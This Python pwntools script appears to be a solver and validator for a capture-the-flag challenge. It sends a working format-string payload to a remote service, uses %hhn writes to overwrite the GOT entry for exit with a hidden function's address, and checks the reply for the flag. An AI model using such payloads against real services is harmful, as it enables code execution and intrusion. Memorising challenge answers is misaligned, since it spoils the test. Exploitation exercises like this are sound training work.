#This challenge is based on a BOF -> GOT -> code redirect that occurs in printf() which *can* replace arbitrary memory.
# 08 42 05 36 <super_secret_function>:
#08422028 R_386_JUMP_SLOT   exit@GLIBC_2.0

from pwn import *
import time

def main(ip, port, flag):
    if True:
        r = remote(ip, port)
        r.sendline("AA\x25\x20\x42\x08A%8$hhnA\x24\x20\x42\x08%42x%11$hhnA\x26\x20\x42\x08%7x%15$hhn")
        print("payload sent")
        response = r.recvall()
        #we replace the GOT entry for exit with the super secret function
        if flag in str(response):
            print("Correct")
            exit(0)
        elif "flag.txt" in str(response):
            print("missing flag.txt")
        else:
            print("Incorrect")
            print("Response: " + str(response))
            exit(1)


#Validation section
flag = input("Flag: ").replace("\n", "")
ip, port = input("service: ").split(":")
main(str(ip), int(port), str(flag))
